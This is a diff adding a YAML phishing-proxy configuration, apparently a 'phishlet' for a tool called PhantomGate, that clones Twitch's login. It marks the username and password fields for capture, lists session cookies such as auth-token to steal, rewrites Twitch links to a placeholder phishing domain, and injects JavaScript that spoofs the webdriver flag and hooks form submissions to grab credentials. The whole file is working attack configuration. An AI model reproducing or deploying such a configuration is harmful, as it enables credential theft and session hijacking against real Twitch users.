@@ -1,0 +1,65 @@
+name: Twitch
+author: PhantomGate
+version: 2.0.0
+description: Twitch authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - twitch.tv
+    - www.twitch.tv
+    - api.twitch.tv
+  
+  login:
+    domain: www.twitch.tv
+    path: /login
+    username:
+      selector: "input#username-input"
+      capture: true
+    password:
+      selector: "input#password-input"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: auth-token
+        regex: ".*"
+      - name: login
+        regex: ".*"
+      - name: persisted
+        regex: ".*"
+      - name: unique_id
+        regex: ".*"
+      - name: player_type
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: twitch.tv
+      inject: true
+    - domain: www.twitch.tv
+      inject: true
+  
+  sub_filters:
+    - domain: twitch.tv
+      search: "https://www.twitch.tv"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Twitch
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#username-input');
+        var password = form.querySelector('#password-input');
+        if (username && password) {
+          console.log('[PhantomGate] Twitch credentials captured');
+        }
+      }, true);
+    })();
